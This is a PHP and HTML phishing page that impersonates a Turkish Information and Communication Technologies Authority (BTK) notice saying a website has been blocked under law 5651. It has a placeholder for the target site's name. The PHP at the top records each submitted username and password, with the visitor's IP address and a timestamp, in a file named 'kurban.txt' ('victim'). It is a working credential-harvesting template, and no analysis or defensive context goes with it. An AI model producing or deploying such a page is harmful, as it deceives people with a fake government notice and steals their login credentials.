<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('kurban.txt', 'a');
fwrite($file, $username. " ----Sifre----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
?>

<!DOCTYPE html>

<html>
  <head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf8">   
	<title>Bilgi Teknolojileri ve İletişim Kurumu</title>
 <style type="text/css">
 
	.erisime_engellenmis {
		font-family: Arial, Helvetica, sans-serif;
		font-size: 32px;
		font-weight: bold;
		color: #0000FF;
		text-decoration: none;
		text-align: center;
		border-right-width: 1px;
		border-left-width: 1px;
		border-right-style: none;
		border-left-style: none;
		border-right-color: #0000FF;
		border-left-color: #0000FF;
		border-top-width: 1px;
		border-top-style: none;
		border-top-color: #0000FF;
		border-bottom-width: 1px;
		border-bottom-style: none;
		border-bottom-color: #0000FF;
	}
	.yazi1 {
		font-family: Georgia, "Times New Roman", Times, serif;
		font-size: 12px;
		line-height: 140%;
		font-weight: normal;
		color: #666666;
		text-decoration: none;
	}
	.yazi2 {
		font-family: Georgia, "Times New Roman", Times, serif;
		font-size: 12px;
		line-height: 140%;
		font-weight: normal;
		color: #6565FF;
		text-decoration: none;
	}
	.yazi3 {
		font-family: Georgia, "Times New Roman", Times, serif;
		font-size: 10px;
		line-height: 140%;
		font-weight: normal;
		color: #BB65FF;
		text-decoration: none;
		padding-bottom: 10px;
	}
	.yazi2_1 {
		font-family: Verdana, "Times New Roman", Times, serif;
		font-size: 12px;
		line-height: 140%;
		font-weight: normal;
		color: #6565FF;
		text-decoration: none;
		padding-bottom: 10px;
	}
	.yazi3_1 {
		font-family: Verdana, "Times New Roman", Times, serif;
		font-size: 10px;
		line-height: 140%;
		font-weight: normal;
		color: #BB65FF;
		text-decoration: none;
		padding-bottom: 10px;
	}
	
	a.link:link {
		font-family: Georgia, "Times New Roman", Times, serif;
		font-size: 11px;
		line-height: 140%;
		font-weight: normal;
		color: #0000FF;
		text-decoration: underline;
	}
	a.link:active {
		font-family: Georgia, "Times New Roman", Times, serif;
		font-size: 11px;
		line-height: 140%;
		font-weight: normal;
		color: #0000FF;
		text-decoration: underline;
	}
	a.link:visited {
		font-family: Georgia, "Times New Roman", Times, serif;
		font-size: 11px;
		line-height: 140%;
		font-weight: normal;
		color: #0000FF;
		text-decoration: underline;
	}
	a.link:hover {
		font-family: Georgia, "Times New Roman", Times, serif;
		font-size: 11px;
		line-height: 140%;
		font-weight: normal;
		color: #BB65FF;
		text-decoration: none;
	}
	.alticizgili_genisliktd {
		height: 100%;
		width: 100%;
		padding-top: 20px;
		border-bottom-width: 1px;
		border-bottom-style: dotted;
		border-bottom-color: #DDCCFE;
		padding-bottom: 10px;
		text-align: center;
	}
	.genisliktd {
		height: 100%;
		width: 100%;
		padding-top: 20px;
		text-align: center;
	}
	.genisliktdbaslik {
		height: 100%;
		width: 100%;
		padding-top: 20px;
		text-align: left;
		border-bottom-width: 5px;
		border-bottom-style: solid;
		border-bottom-color: #DDCCFE;
	} 
 </style>
 <br><br><br><br><br><br><br><br><br><br><br><br><br><br>
 </head>  
  <body onselectstart="return false" bgcolor="aliceblue">
  <div>

  <table border ="0" align="center" cellpadding="0" cellspacing="0" width="1024" height="100%"> 
<tr> <td class="alticizgili_genisliktd">
 <span class="yazi1">5651 sayılı kanun kapsamında yapılan teknik inceleme ve hukuki değerlendirme sonucunda alınan <span class="yazi2_1">Bilgi Teknolojileri ve İletişim Kurumu</span><span class="yazi1">'nun</span><span class="yazi2_1"> 01/01/1071</span><span class = "yazi1"> tarih ve </span><span class="yazi2_1">
			  490.05.01.2017.-431792 </span><span class="yazi1">sayılı kararına istinaden bu internet sitesi</span><span class="yazi2_1">(SİTENİZİN ADI)</span><span class="yazi1"> hakkında idari tedbir uygulanmaktadır.</span>

		      <br>
		      <br>
		      <span class="yazi3_1">After technical analysis and legal consideration based on the law nr. 5651, administration measure has been taken for this website  
		      (SİTENİZİN ADI) according to decision nr. 490.05.01.2017.-431792 dated 01/01/1071 of the Information and Communication Technologies Authority.</span>
<br>
<br>
<br>		   
  
	   <a class="link" target = "_blank" href="http://www.btk.gov.tr">http://www.btk.gov.tr</a>&nbsp;|
	   <a class="link" target = "_blank" href="http://www.guvenlinet.org">http://www.guvenlinet.org</a>&nbsp;|
	   <a class="link" target = "_blank" href="http://www.ihbarweb.org.tr">http://www.ihbarweb.org.tr</a>
	   </td>
   </tr>
       
  </table>
  </div> 
  </body>
</html>
